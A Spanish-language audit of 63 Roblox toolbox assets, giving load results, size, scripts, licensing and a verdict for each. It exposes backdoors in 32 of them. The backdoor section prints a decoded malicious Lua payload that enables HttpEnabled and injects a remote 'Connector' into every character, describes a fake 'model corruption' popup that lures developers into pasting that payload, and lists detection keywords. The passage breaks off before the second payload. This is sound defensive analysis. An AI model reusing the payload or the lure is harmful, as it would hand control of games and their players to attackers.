# Assets elegidos por Sebastián (4ª tanda): qué hay dentro

Igual que en `docs/assets-usuario-3.md`: volcado hecho en un servidor de Roblox con
`AssetService:LoadAssetAsync(id)` (con `pcall`).
Script: `scripts/cloud/assets-usuario-4.luau` → `bash scripts/cloud-test.sh -v assets-usuario-4`.
Se lanzó en unas 20 ejecuciones (cambiando `IDS`): la consola de la API solo guarda las ~5 000 últimas líneas y
algunas tareas se quedaban «en cola» más de 8 minutos. Los packs enormes van con `CORTO`.
Datos públicos de cada asset: `https://apis.roblox.com/toolbox-service/v1/items/details?assetIds=…`.
Imágenes (Decals, cielos, miniaturas) mirados con `thumbnails.roblox.com`. Creador de cada malla con
`economy.roblox.com/v2/assets/<id>/details`.
Fecha: 2026-10-01.

Nuevo en esta tanda:

- De cada `Sound` y `Animation` se pide `MarketplaceService:GetProductInfo`: creador y si es **público**
  (`IsPublicDomain`). Un audio no público solo suena en juegos de su dueño; una animación de otro creador
  **no se reproduce** en nuestro juego.
- Se enseñan los **atributos** de todos los objetos (el virus de la 3ª tanda esconde ahí su código).
- Se baja un nivel más (N3) para ver los vehículos que están dentro de dos carpetas.
- Si un script tiene algo grave (`require`, `string.char`, `MarketplaceService`…), se lee **entero**.

Notas generales:

- Cargan **los 63**. El autobús 18912826861 hacía fallar la tarea de Roblox con el volcado completo
  («Task timed out due to an internal error», 3 veces); con un script mínimo aparte (solo clases, tallas,
  Decals, sonidos y palabras peligrosas) sí se pudo ver. Ese script temporal no se ha guardado.
- Todos son **gratis** y de creadores con insignia de verificado (no dice nada de la seguridad: ver abajo).
- **Triángulos por malla / por palmera**: no se pueden leer. `EditableMesh` falla con «no permission to
  load asset» en mallas de otros creadores. Los tris son los totales del toolbox; por palmera se da una
  media (tris del pack ÷ mallas).
- Las texturas de `SurfaceAppearance` no se pueden leer desde el servidor.
- Scripts: se leyó el `Source` de todos y se buscó `require(número)`, `require(algo.Value)`, `getfenv`,
  `setfenv`, `loadstring`, `HttpService`, `MarketplaceService`, `TeleportService`, `InsertService`,
  `LoadAsset`, `string.char`/`string.reverse`, `\x`, `Kick`, `PlayerAdded`, `RemoteEvent`,
  `FireServer`/`FireClient`.
- **32 de los 63 assets tienen una puerta trasera** (5 trucos distintos, ver «⛔ Puertas traseras»).
  Son todos los de 6 creadores: Ixcraz8397, LiamH3ro45, lun42386, Warpzaor68, healiattel y xw4m5.
  Todos de 2026 y con una ristra de etiquetas de reclamo en la descripción.
- «carrocería / ruedas / cristales / asientos» se cuentan por el nombre de la pieza, su material y su
  transparencia; es aproximado.
- ⚠ = script: hay que borrarlo o revisarlo al usar el asset. ⛔ = puerta trasera o trampa.

## Resumen

| id | Qué es | ¿Carga? | Piezas / tris (toolbox) | Scripts | Valoración |
|---|---|---|---|---|---|
| 14887624955 | Realistic Horror Pack: muestrario de 72 losetas con `Texture` + Lighting de terror + puerta + árbol | ✅ | 82 piezas / 2 879 tris | ⚠ 4 | **útil con cuidado** — limpio, pero las texturas son antiguas (sin PBR) y el Lighting es de terror (niebla, desenfoque). Las mismas texturas que 11877329379. |
| 115493232746766 | Realistic weapons pack ACS 2.01: ~80 armas | ✅ | 1 295 MeshPart / 575 110 tris | 0 | **no usar** — armas reales (Glock, HK416, M4A1, AK-74…) y copiadas de juegos: **Apex Legends** (Wingman, Kraber, R-301, Hemlok, Flatline, Spitfire, G7 Scout), **Half-Life 2** (OSIPR Pulse Rifle), **Call of Duty** (Holger26, M13B, STG, ODEN). |
| 2161748423 | Realistic Mesh Track Pack: 7 trozos de vía de tren | ✅ | 7 MeshPart / 10 842 tris | 0 | **útil** — vías con traviesas de hormigón: 15, 30, 60, 120 studs, una plataforma de 145×145 y un tope. Limpio y ligero. |
| 130967743753364 | Realistic Autoservice Props Pack: taller mecánico | ✅ | 103 MeshPart (72 PBR) / 218 105 tris | 0 | **útil** — grúa de motor, gatos, caballetes, compresor, generador, bancos de trabajo, cajas de herramientas, extintor, foco LED… Sin scripts ni marcas. |
| 11877329379 | Realistic Texture Pack: 157 losetas de muestra | ✅ | 157 Part, 775 `Texture` | ⚠ 1 (ReadMe) | **útil con cuidado** — ladrillo, tejas, moqueta, baldosa, cristal, yeso, metal, hormigón, paisaje, papel pintado, madera. Son `Texture` antiguas (sin PBR): solo para copiar ids. |
| 13583409363 | SCP-087: escalera de terror de 484 studs | ✅ | 803 Part, 2 940 Texture / 755 944 tris | 0 | **no usar** — mapa de terror (SCP) y muy pesado. |
| 16845477360 | Chernobyl Ferris Wheel: noria oxidada | ✅ | 84 piezas (65 MeshPart) / 85 698 tris | 0 | **útil con cuidado** — noria de 110×112×30 con 18 cabinas. Limpia, pero no gira (sin scripts) y su estética es de ciudad abandonada (Prípiat). |
| 120631576642977 | Realistic Server Rack: armario de servidores | ✅ | 15 MeshPart PBR / 27 853 tris | 0 | **útil con cuidado** — 2.3×7.5×2.6, 11 servidores sueltos y puerta de cristal. La descripción dice que el modelo es de «EntropyNine» en **Sketchfab** (licencia no indicada). |
| 113349334619202 | R15 Running Animation Pack (lun42386) | ✅ | 14 MeshPart | ⚠ 4 | **no usar** ⛔ — `LightConfig` con `require` escondido (familia 4). La animación solo está como `KeyframeSequence`. |
| 122782784244668 | Realistic Sun Glare (lun42386): brillo del sol en pantalla | ✅ | 0 piezas | ⚠ 5 | **no usar** ⛔ — familia 4. |
| 139484418601989 | «City Sky Skyscraper Building» (lun42386) | ✅ | 0 piezas: solo un `Sky` | ⚠ 3 | **no usar** ⛔ — familia 4. Y **no trae edificios**: es un cielo con una **foto real de Tokio** en los 4 lados. |
| 95946642626421 | Infinite Terrain Generator (lun42386) | ✅ | 0 piezas | ⚠ 4 | **no usar** ⛔ — familia 4. |
| 102765136165948 | Classic Skyboxes Collection: 11 cielos | ✅ | 1 Part, 11 `Sky` | ⚠ 3 | **no usar** ⛔ — familia 4. Los cielos son los clásicos de Roblox; si se quiere uno, copiar a mano sus 6 ids (ver detalle) a un `Sky` nuevo. |
| 83730474928094 | Gojo Moveset (lun42386): poderes de *Jujutsu Kaisen* | ✅ | 8 MeshPart / 9 237 tris | ⚠ 16 | **no usar** ⛔ — familia 4, personaje de anime con copyright y daño a jugadores. |
| 113036863157630 | Green Clouds Skybox (lun42386) | ✅ | 1 `Sky` | ⚠ 3 | **no usar** ⛔ — familia 4. Cielo verde oscuro. |
| 78033796632460 | realistic guns mesh pack Pistol Giver: un M4 | ✅ | 1 MeshPart / 1 849 tris | ⚠ 2 | **no usar** ⛔ — familia 3 (virus «Texture Streaming»). |
| 8380605189 | realistic train pack: 12 vagones y locomotoras de vapor | ✅ | 3 903 piezas / 653 989 tris | ⚠ 158 | **útil con cuidado** — conducibles y bonitos, pero de bloques, muy pesados, con nombres y logos de **compañías reales** (Union Pacific, PRR, NYC, CN, Lackawanna, Strasburg) y 35 de 40 sonidos **no públicos**. |
| 8386763665 | Realistic long train track: 128 studs de vía | ✅ | 42 piezas / 1 232 tris | 0 | **útil** — 8 tramos de 16 con balasto y textura. Limpio. |
| 10887600145 | «Mesh ##### steam train»: locomotora + ténder | ✅ | 2 MeshPart / 2 964 tris | 0 | **útil con cuidado** — 2 mallas con textura, solo decorativas. Enorme (134.7 de largo). |
| 18577576400 | Realistic Car Pack (NOT MINE!): 27 deportivos | ✅ | 7 998 piezas (5 066 MeshPart) / 697 449 tris | ⚠ 1 501 | **no usar** — el propio título dice «NOT MINE». Todos con marca real (Porsche, Ferrari, Lamborghini, Bugatti, Nissan…), logos (Lamborghini, SRT8, RX-7 «Spirit R», Z-tune), radio que pone cualquier audio y ⛔ `Protector 2.0` en el «Turbo S». |
| 18912826861 | Tap Bus: autobús urbano de Barbados | ✅ (volcado mínimo) | 162 MeshPart / 255 505 tris | ⚠ 97 | **útil con cuidado** — autobús de 51.6 de largo con 47 asientos y A-Chassis. Lleva el logo real del **Transport Board** de Barbados y 97 scripts. Usar solo la carrocería, borrando todos los scripts. |
| 18777387875 | Barbados Gates (UNFINISHED): entrada de urbanización | ✅ | 3 144 piezas / 772 170 tris | ⚠ 16 | **útil con cuidado** — puertas que se abren solas, bancos, farolas y setos. Limpio, pero **muy pesado** (las 6 jardineras son 1 920 hojas de bloque). |
| 116641210728889 | Realistic Campfire (Warpzaor68): hoguera | ✅ | 47 piezas / 80 204 tris | ⚠ 3 | **no usar** ⛔ — familia 5 (`PoseLink`). |
| 107730003845316 | Run Anim R6 (Warpzaor68) | ✅ | 14 piezas | ⚠ 9 | **no usar** ⛔ — familia 5. La animación es de otro creador (Tengvang). |
| 106442157390222 | «Doors Drawer Hotel» (Warpzaor68): cómoda de *DOORS* | ✅ | 11 MeshPart / 846 tris | ⚠ 2 | **no usar** ⛔ — familia 5 y cómoda sacada del juego **DOORS** (sonidos de LSPLASH, el estudio de DOORS). |
| 135266547724797 | «Sky Cloud Floating Island» (Warpzaor68) | ✅ | 1 `Sky` | ⚠ 3 | **no usar** ⛔ — familia 5. Además no hay isla: una sola textura morada oscura en los 6 lados. |
| 111283915226740 | «Polska Dom Mapa» (Warpzaor68): casa polaca | ✅ | 815 piezas / 69 574 tris | ⚠ 2 | **no usar** ⛔ — familia 5. Y es una casa de bloques muy simple. |
| 17536656565 | GM_Poolrooms kit: piscina «liminal» | ✅ | 23 Part, 102 Texture | ⚠ 3 | **no usar** — limpio, pero es decorado de terror *liminal*, no de ciudad. |
| 13843689263 | backrooms level 0.01 kit | ✅ | 56 Part, 83 Texture | 0 | **no usar** — limpio, pero son las *Backrooms* (terror). |
| 8294099223 | Simple Lighting Pack (Realistic) | ✅ | 6 objetos de Lighting | 0 | **útil** — Atmosphere, Sky, Bloom, ColorCorrection, DepthOfField y SunRays, sin scripts. Cuidado: el DepthOfField desenfoca mucho lo cercano. |
| 79665094662717 | Realistic Japan City Pack (healiattel): 5 rascacielos | ✅ | 98 piezas (78 MeshPart) / 57 087 tris | ⚠ 5 | **no usar** ⛔ — familias 3 y 4. Las palmeras son las mismas mallas que 114397068371248. |
| 123778443128832 | Group Rewards Chest (LiamH3ro45) | ✅ | 7 MeshPart / 2 234 tris | ⚠ 8 | **no usar** ⛔ — familia 2. |
| 82136423205151 | Car Show Display: plataforma giratoria | ✅ | 4 Part / 192 tris | 0 | **útil** — disco de 20×20 con `HingeConstraint` y un foco (`SpotLight`). Para un concesionario. Limpio. |
| 95413639317338 | Fried Egg (LiamH3ro45): huevo frito | ✅ | 1 MeshPart / 384 tris | ⚠ 6 | **no usar** ⛔ — familia 2. |
| 133967929770771 | Lift Out of Order Sign (LiamH3ro45) | ✅ | 6 Part | ⚠ 6 | **no usar** ⛔ — familia 2 y logo de una empresa real («**Consult lift services**»). |
| 92375378852064 | Rainbow Sky (LiamH3ro45): cielo arcoíris | ✅ | 1 `Sky` | ⚠ 6 | **no usar** ⛔ — familia 2. |
| 114397068371248 | Foliage Pack (Ixcraz8397): 4 palmeras, helechos, arbustos, sauce | ✅ | 44 MeshPart (43 PBR) / 66 073 tris | ⚠ 6 | **no usar** ⛔ — familia 1 (activa `HttpEnabled`). Las mallas son de otros creadores (2017-2020). |
| 72475149726020 | Trees / Foliage Tropical (Ixcraz8397): 10 grupos de palmeras | ✅ | 112 piezas (102 MeshPart) / 160 716 tris | ⚠ 6 | **no usar** ⛔ — familia 1. Mallas de Build2Brick (2018) con `Texture` antiguas. |
| 109211499509239 | Cherry Blossom Tree (Ixcraz8397): cerezo | ✅ | 7 piezas / 11 785 tris | ⚠ 8 | **no usar** ⛔ — familia 1. Su animación es de otro creador (no se reproduce). |
| 126164979250031 | Realistic tree (Ixcraz8397): haya | ✅ | 2 MeshPart / 5 638 tris | ⚠ 6 | **no usar** ⛔ — familia 1 (activa `HttpEnabled`). Es el `BeechwoodTree` de Roblox. |
| 8649374407 | Realistic Pack (xXCHARLIE_BOlXx): tiburones, personas, perro, conejo | ✅ | 23 piezas / 200 252 tris | ⚠ 7 | **útil con cuidado** — sin virus. 7 tiburones (4 con scripts viejos que los mueven), 4 estatuas de mujeres «realistas», un perro y un conejo de una sola malla. |
| 14062245022 | SCP-096: monstruo | ✅ | 18 MeshPart / 28 889 tris | ⚠ 4 | **no usar** — NPC de terror que **mata** (`Kill`), sonido «Gore», música de *Silent Hill*; animaciones y audios privados de otros. |
| 131772048424194 | SCP:CB Footstep Sounds: pasos según el suelo | ✅ | 25 `Sound` | ⚠ 1 | **útil con cuidado** — los 5 audios son **públicos** (suenan en cualquier juego). Son de *SCP: Containment Breach* (licencia CC BY-SA: hay que dar crédito). |
| 8043394685 | «### animation but better»: SCP-096 animado | ✅ | 5 MeshPart / 54 980 tris | 0 | **no usar** — monstruo SCP-096 (terror). |
| 9658188636 | REALISTIC PACK! (Tubarao255): muebles + Lighting | ✅ | 19 MeshPart / 25 799 tris | ⚠ 3 | **útil con cuidado** — mesa, PC, sillas… y un Lighting cálido (ColorCorrection, SunRays 1, Blur 1). Limpio. Mallas de otros creadores. |
| 11188629897 | «Elevator»: montacargas de obra con valla | ✅ | 1 032 piezas / 101 864 tris | 0 | **útil con cuidado** — limpio, pero no se mueve y pesa mucho (676 alambres de valla). |
| 12110426279 | REALISTIC PACK (CDevChair): ~180 props | ✅ | 334 piezas (326 MeshPart) / 286 976 tris | ⚠ 1 (soldador) | **útil con cuidado** — coches y camiones de una malla, retretes de obra, sillas de cafetería, taquillas, nevera, sofás, papeleras… Sin PBR. Mallas de otros (2016-2018). |
| 13188926423 | Bingus Particle Pack: 240 imágenes para partículas | ✅ | 240 Part + Decal | 0 | **útil** — humo, chispas, lluvia, nieve, hojas, burbujas, fuegos artificiales… para `ParticleEmitter`. Limpio. |
| 14800241387 | Model (CDevChair): ~40 armas | ✅ | 442 piezas / 127 213 tris | 0 | **no usar** — armas reales sacadas del juego **Bad Business** (su sonido es del grupo «Bad Business»). |
| 82460675146164 | More Food (healiattel): montón de comida | ✅ | 1 MeshPart / 894 tris | ⚠ 5 | **no usar** ⛔ — familias 3 y 4. |
| 131247677717086 | Realistic Tires (healiattel): 4 neumáticos apilados | ✅ | 1 MeshPart 4×4×4 / 2 478 tris | ⚠ 5 | **no usar** ⛔ — familias 3 y 4. Malla de DominikCzoo (2023), gris, sin textura. |
| 78188971759943 | japanese shrine lantern (healiattel): farol de piedra | ✅ | 1 MeshPart / 19 846 tris | ⚠ 4 | **no usar** ⛔ — familias 3 y 5. |
| 114120925733217 | mallet (healiattel): mazo | ✅ | 2 MeshPart / 10 048 tris | ⚠ 2 | **no usar** ⛔ — familia 3. |
| 99043731526992 | Roof Wall Floor Area51 (healiattel): pared de metal | ✅ | 1 Part, 1 Texture | ⚠ 4 | **no usar** ⛔ — familia 3 **dos veces** (una activa `HttpEnabled`). |
| 93376997873263 | Anime Fantasy Forest Map (healiattel): cielo | ✅ | `Sky` + `Atmosphere` | ⚠ 3 | **no usar** ⛔ — familias 3 y 5. |
| 124865259344404 | Abandoned Truck 1 (healiattel): camión viejo | ✅ | 1 MeshPart 9.8×9.6×24 / 4 460 tris | ⚠ 2 | **no usar** ⛔ — familia 3. Es un camión **International** (marca real). |
| 130817699186912 | The Mimic Japanese Props (healiattel) | ✅ | 514 piezas / 188 135 tris | ⚠ 2 | **no usar** ⛔ — familia 3 y props sacados del juego **The Mimic**. |
| 124581242124664 | Cat Gun (healiattel): gato que dispara | ✅ | 3 piezas / 8 749 tris | ⚠ 11 | **no usar** ⛔ — familias 3 y 5, y es un arma que hace daño. |
| 130974691456028 | Realistic Box Truck (healiattel): camión caja | ✅ | 1 MeshPart 25.5×12.2×8.9 / 5 021 tris | ⚠ 2 | **no usar** ⛔ — familia 3. Malla de TCtully (2016). |
| 4573650411 | CHP pack: 3 coches de policía (×2) | ✅ | 1 008 piezas / 908 534 tris | ⚠ 292 | **útil con cuidado** — Dodge Charger, Ford Explorer y Crown Victoria de la **California Highway Patrol** (policía real) con sirenas. Sin virus, pero muy pesado y con marcas reales. |
| 10897563593 | «Car» (YouCanCallMeCouch5) | ✅ | 3 742 piezas / 489 724 tris | ⚠ 2 010 | **no usar** — **copia exacta** del Semi-Realistic Car Pack de SubXero_X (9432856072, 3ª tanda), con su trampa ⛔ `Protector 2.0`. Si acaso, usar el original con las precauciones de la 3ª tanda. |
| 10935800149 | «Car Pack» (YouCanCallMeCouch5) | ✅ | igual que el anterior | ⚠ 2 010 | **no usar** — otra copia exacta del mismo pack. |
| 97902046131324 | mesh pack (Teddy_FV): 11 coches europeos de malla | ✅ | 75 MeshPart / 52 733 tris | 0 | **útil con cuidado** — coches aparcados **muy ligeros** (~4 800 tris cada uno) con textura y ruedas sueltas: Peugeot 206, Toyota Hiace, Opel Astra… Sin scripts. Pero son **modelos reales importados** («im imported»; nombres `Object_N` de una exportación de Sketchfab). |

### Datos del toolbox

| id | Nombre | Creador | 👍/👎 | Tris | Vértices | MeshParts | Scripts | Decals | Audios | Tools | Precio | Creado |
|---|---|---|---|---|---|---|---|---|---|---|---|---|
| 14887624955 | Realistic Horror Pack 1.0 | goldxim ✔ | 18 / 2 | 2 879 | 4 532 | 2 | 4 | 1 | 4 | 0 | gratis | 2023-09-26 |
| 115493232746766 | Realistic weapons pack acs 2.01 (put in gunmodels) | BACON_IQ0 ✔ | 0 / 0 | 575 110 | 1 048 574 | 1 295 | 0 | 1 146 | 1 060 | 0 | gratis | 2024-10-20 |
| 2161748423 | Realistic Mesh Track Pack | lucasricklefs1 ✔ | 0 / 0 | 10 842 | 18 030 | 7 | 0 | 0 | 0 | 0 | gratis | 2018-08-02 |
| 130967743753364 | Realistic Autoservice Props Pack | NyrexBLX ✔ | 0 / 0 | 218 105 | 247 494 | 103 | 0 | 0 | 0 | 0 | gratis | 2025-12-12 |
| 11877329379 | Realistic Texture Pack | W1therEdBonn1e728 ✔ | 67 / 3 | 3 436 | 6 872 | 0 | 1 | 1 | 0 | 0 | gratis | 2022-12-21 |
| 13583409363 | SCP-087 | W1therEdBonn1e728 ✔ | 8 / 2 | 755 944 | 546 944 | 0 | 0 | 152 | 0 | 0 | gratis | 2023-05-29 |
| 16845477360 | Chernobyl Ferris Wheel | W1therEdBonn1e728 ✔ | 0 / 0 | 85 698 | 139 574 | 65 | 0 | 0 | 0 | 0 | gratis | 2024-03-23 |
| 120631576642977 | Realistic Server Rack | W1therEdBonn1e728 ✔ | 10 / 0 | 27 853 | 30 579 | 15 | 0 | 0 | 0 | 0 | gratis | 2025-03-01 |
| 113349334619202 | R15 Running Animation Pack Smooth Realistic RP | lun42386 ✔ | 0 / 0 | (no lo da) | (no lo da) | — | — | — | — | — | gratis | 2026-02-10 |
| 122782784244668 | Realistic Sun Glare Effect Light Beam RP | lun42386 ✔ | 0 / 0 | (no lo da) | (no lo da) | — | — | — | — | — | gratis | 2026-02-10 |
| 139484418601989 | City Sky Skyscraper Building Road View RP | lun42386 ✔ | 0 / 0 | (no lo da) | (no lo da) | — | — | — | — | — | gratis | 2026-02-10 |
| 95946642626421 | Infinite Terrain Generator World Landscape | lun42386 ✔ | 0 / 0 | (no lo da) | (no lo da) | — | — | — | — | — | gratis | 2026-02-10 |
| 102765136165948 | Classic Skyboxes Collection Set Pack | lun42386 ✔ | 0 / 0 | 0 | 0 | 0 | 1 | 1 | 0 | 0 | gratis | 2026-02-10 |
| 83730474928094 | Gojo Moveset Combat Anime Skills Power | lun42386 ✔ | 0 / 0 | 9 237 | 14 711 | 8 | 14 | 0 | 5 | 1 | gratis | 2026-02-10 |
| 113036863157630 | Green Clouds Skybox! Cloudy Sky Landscape | lun42386 ✔ | 0 / 0 | (no lo da) | (no lo da) | — | — | — | — | — | gratis | 2026-02-10 |
| 78033796632460 | 🔥 realistic guns mesh pack Pistol Giver | xw4m5 ✔ | 0 / 0 | 1 849 | 3 429 | 1 | 2 | 0 | 0 | 0 | gratis | 2026-07-09 |
| 8380605189 | realistic train pack | tcnorthcutt ✔ | 0 / 0 | 653 989 | 1 048 574 | 54 | 136 | 111 | 99 | 0 | gratis | 2021-12-28 |
| 8386763665 | Realistic long train track :) | tcnorthcutt ✔ | 57 / 3 | 1 232 | 1 880 | 24 | 0 | 0 | 0 | 0 | gratis | 2021-12-28 |
| 10887600145 | Mesh ##### steam train | tcnorthcutt ✔ | 0 / 0 | 2 964 | 3 756 | 2 | 0 | 0 | 0 | 0 | gratis | 2022-09-11 |
| 18577576400 | Realistic Car Pack(NOT MINE!) | dragonfox93246 ✔ | 16 / 4 | 697 449 | 1 048 574 | 5 066 | 1 420 | 235 | 518 | 1 | gratis | 2024-07-20 |
| 18912826861 | Tap Bus | dragonfox93246 ✔ | 0 / 0 | 255 505 | 407 036 | 162 | 97 | 81 | 44 | 0 | gratis | 2024-08-12 |
| 18777387875 | Barbados Gates(UNFINISHED) | dragonfox93246 ✔ | 0 / 0 | 772 170 | 594 752 | 50 | 16 | 12 | 0 | 0 | gratis | 2024-08-03 |
| 116641210728889 | ☁️ Realistic Campfire Realistic Forest Pack | Warpzaor68 ✔ | 0 / 0 | 80 204 | 56 210 | 21 | 3 | 3 | 1 | 0 | gratis | 2026-04-02 |
| 107730003845316 | 🏃‍♂️ Run Anim R6 Motion Player Movement Animation | Warpzaor68 ✔ | 0 / 0 | 2 292 | 1 944 | 0 | 8 | 2 | 0 | 0 | gratis | 2026-04-02 |
| 106442157390222 | 🏠 Doors Drawer Hotel Killer Seek Rush Figure RP | Warpzaor68 ✔ | 0 / 0 | 846 | 1 598 | 11 | 2 | 0 | 6 | 0 | gratis | 2026-04-02 |
| 135266547724797 | ☁️ Sky Cloud Floating Island Airscape Realm Horizo | Warpzaor68 ✔ | 0 / 0 | 0 | 0 | 0 | 2 | 0 | 0 | 0 | gratis | 2026-04-02 |
| 111283915226740 | 🏠 Polska Dom Mapa! Polish House City Town RP | Warpzaor68 ✔ | 0 / 0 | 69 574 | 83 730 | 1 | 2 | 0 | 0 | 0 | gratis | 2026-04-02 |
| 17536656565 | GM_Poolrooms_spaces kit | roblocs240487 ✔ | 0 / 0 | 604 | 1 134 | 0 | 3 | 6 | 0 | 0 | gratis | 2024-05-18 |
| 13843689263 | backrooms level 0.01 kit (fixed thumbnailcamera) | roblocs240487 ✔ | 0 / 0 | 826 | 1 652 | 0 | 0 | 0 | 0 | 0 | gratis | 2023-06-24 |
| 8294099223 | Simple Lighting Pack (Realistic) | Isley1111 ✔ | 0 / 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | gratis | 2021-12-19 |
| 79665094662717 | 🏯 Realistic Japan City Pack Buildings Houses Stre | healiattel ✔ | 0 / 0 | 57 087 | 71 487 | 78 | 3 | 0 | 0 | 0 | gratis | 2026-07-23 |
| 123778443128832 | Group Rewards Chest Loot Cache Prize Premium | LiamH3ro45 ✔ | 0 / 0 | 2 234 | 2 999 | 7 | 7 | 0 | 0 | 0 | gratis | 2026-06-09 |
| 82136423205151 | Car Show Customization Event Vehicles Display | LiamH3ro45 ✔ | 0 / 0 | 192 | 228 | 0 | 0 | 0 | 0 | 0 | gratis | 2026-06-09 |
| 95413639317338 | Sunny Fried Egg Breakfast Food Icon | LiamH3ro45 ✔ | 0 / 0 | 384 | 241 | 1 | 6 | 0 | 0 | 0 | gratis | 2026-06-10 |
| 133967929770771 | Lift Out of Order Sign Warning Elevator Broken | LiamH3ro45 ✔ | 0 / 0 | 76 | 152 | 0 | 6 | 2 | 0 | 0 | gratis | 2026-06-09 |
| 92375378852064 | Rainbow Sky Vibe Room Dream Skybox | LiamH3ro45 ✔ | 0 / 0 | 0 | 0 | 0 | 6 | 0 | 0 | 0 | gratis | 2026-06-09 |
| 114397068371248 | [Free!] Foliage Pack (Realistic) - Tree Bush Grass | Ixcraz8397 ✔ | 0 / 0 | 66 073 | 89 531 | 44 | 6 | 0 | 0 | 0 | gratis | 2026-09-16 |
| 72475149726020 | [Best!] Trees / Foliage - Tropical, Jungle, Island | Ixcraz8397 ✔ | 0 / 0 | 160 716 | 148 019 | 102 | 6 | 0 | 0 | 0 | gratis | 2026-09-16 |
| 109211499509239 | [Free!] Cherry Blossom Tree! Updated City Roleplay | Ixcraz8397 ✔ | 0 / 0 | 11 785 | 16 868 | 2 | 8 | 0 | 0 | 0 | gratis | 2026-09-16 |
| 126164979250031 | [Updated!] Realistic tree! Working Furniture Ocean | Ixcraz8397 ✔ | 0 / 0 | 5 638 | 6 065 | 2 | 6 | 0 | 0 | 0 | gratis | 2026-09-16 |
| 8649374407 | Realistic Pack | xXCHARLIE_BOlXx ✔ | 0 / 0 | 200 252 | 200 752 | 17 | 7 | 0 | 0 | 0 | gratis | 2022-01-26 |
| 14062245022 | Extremley Rare SCP-096 | xXCHARLIE_BOlXx ✔ | 0 / 0 | 28 889 | 78 457 | 18 | 4 | 0 | 9 | 0 | gratis | 2023-07-14 |
| 131772048424194 | SCP:CB Footstep Sounds | xXCHARLIE_BOlXx ✔ | 0 / 0 | 0 | 0 | 0 | 1 | 0 | 25 | 0 | gratis | 2026-04-27 |
| 8043394685 | ### animation but better | xXCHARLIE_BOlXx ✔ | 0 / 0 | 54 980 | 49 230 | 5 | 0 | 0 | 1 | 0 | gratis | 2021-11-19 |
| 9658188636 | REALISTIC PACK! | Tubarao255 ✔ | 0 / 0 | 25 799 | 49 063 | 19 | 2 | 0 | 0 | 0 | gratis | 2022-05-18 |
| 11188629897 | Elevator | Tubarao255 ✔ | 0 / 0 | 101 864 | 111 794 | 1 | 0 | 0 | 0 | 0 | gratis | 2022-10-06 |
| 12110426279 | REALISTIC PACK | CDevChair ✔ | 0 / 0 | 286 976 | 328 816 | 326 | 1 | 5 | 0 | 0 | gratis | 2023-01-10 |
| 13188926423 | Bingus Particle Pack | CDevChair ✔ | 0 / 0 | 3 360 | 6 720 | 0 | 0 | 240 | 0 | 0 | gratis | 2023-04-20 |
| 14800241387 | Model | CDevChair ✔ | 0 / 0 | 127 213 | 199 509 | 411 | 0 | 0 | 1 | 0 | gratis | 2023-09-17 |
| 82460675146164 | 🍔 More Food (Mesh) Food Pack Realistic Props Mesh | healiattel ✔ | 0 / 0 | 894 | 952 | 1 | 3 | 0 | 0 | 0 | gratis | 2026-07-23 |
| 131247677717086 | 🛞 Realistic Tires Wheels Rubber Car Truck Road | healiattel ✔ | 0 / 0 | 2 478 | 1 322 | 1 | 3 | 0 | 0 | 0 | gratis | 2026-07-23 |
| 78188971759943 | japanese shrine lantern Garden Temple Samurai Doj | healiattel ✔ | 0 / 0 | 19 846 | 12 084 | 1 | 3 | 0 | 0 | 0 | gratis | 2026-07-23 |
| 114120925733217 | mallet | healiattel ✔ | 0 / 0 | 10 048 | 22 737 | 2 | 2 | 0 | 0 | 0 | gratis | 2026-07-23 |
| 99043731526992 | Roof Wall Floor Area51 Concrete Metal | healiattel ✔ | 0 / 0 | 14 | 28 | 0 | 4 | 0 | 0 | 0 | gratis | 2026-07-23 |
| 93376997873263 | Anime Fantasy Forest Map RP Hangout Vibe | healiattel ✔ | 0 / 0 | 0 | 0 | 0 | 3 | 0 | 0 | 0 | gratis | 2026-07-23 |
| 124865259344404 | Abandoned Truck 1 | healiattel ✔ | 0 / 0 | 4 460 | 10 466 | 1 | 2 | 0 | 0 | 0 | gratis | 2026-07-23 |
| 130817699186912 | The Mimic Japanese Props | healiattel ✔ | 0 / 0 | 188 135 | 186 231 | 16 | 2 | 12 | 0 | 0 | gratis | 2026-07-23 |
| 124581242124664 | 🔫 Cat Gun Laser Pet Weapon Fire Shooter 3D | healiattel ✔ | 0 / 0 | 8 749 | 16 786 | 2 | 11 | 0 | 2 | 1 | gratis | 2026-07-23 |
| 130974691456028 | Realistic Box Truck (Mesh) | healiattel ✔ | 0 / 0 | 5 021 | 7 366 | 1 | 2 | 0 | 0 | 0 | gratis | 2026-07-23 |
| 4573650411 | CHP pack | Xollare ✔ | 0 / 0 | 908 534 | 1 048 398 | 828 | 274 | 16 | 86 | 0 | gratis | 2020-01-04 |
| 10897563593 | Car | YouCanCallMeCouch5 ✔ | 0 / 0 | 489 724 | 1 048 575 | 2 307 | 1 926 | 1 547 | 592 | 0 | gratis | 2022-09-12 |
| 10935800149 | Car Pack | YouCanCallMeCouch5 ✔ | 0 / 0 | 489 724 | 1 048 575 | 2 307 | 1 926 | 1 547 | 592 | 0 | gratis | 2022-09-17 |
| 97902046131324 | mesh pack | Teddy_FV ✔ | 0 / 0 | 52 733 | 36 467 | 75 | 0 | 0 | 0 | 0 | gratis | 2025-06-12 |

(✔ = creador verificado. El toolbox cuenta como «scripts» solo Script y LocalScript. Para los cielos y
scripts de lun42386 el toolbox no da tris ni contadores.)

## ⛔ Puertas traseras: 32 assets, 5 trucos

Ninguno se ha ejecutado: el volcado solo lee el texto de los scripts. Los modelos que intentan meter no
se han cargado.

### Familia 1 — «CoreValidation» + texto al revés en un `PlaneConstraint` (Ixcraz8397)

114397068371248, 72475149726020, 109211499509239, 126164979250031.

Escondido dentro de `…SurfaceAppearance.Dependencies.Utilities` o de un `Bone` (sitios donde nadie
mira). Un `Script` «CoreValidation v1.0» enseña una ventana: «**Model corruption detected** … Copy the
code below, open the Roblox Studio Command Bar, paste the script … (Error: 502)», con un botón «Copy
Code» que se pone naranja («HIGHLIGHTED, PRESS CTRL + C NOW»). El código sale de un atributo `a` escrito
al revés. Una vez dado la vuelta:

`game:GetService("HttpService").HttpEnabled=true; local o=game:GetObjects("rbxassetid://105014713060576")[1] o:FindFirstChild("Connector",true).Parent=game:GetService("StarterPlayer").StarterCharacterScripts`

Activa las peticiones a Internet y mete un «Connector» que se copia en **cada personaje**: una puerta
trasera completa. Los objetos llevan atributos `InjectedByDependencyInjector=true`.

### Familia 2 — «CoreValidation» con `string.char` (LiamH3ro45)

123778443128832, 95413639317338, 133967929770771, 92375378852064.

La misma ventana falsa, pero el código está como lista de números («Obfuscated/Alternative method that
avoids static filters», dice el propio comentario). Traducido:

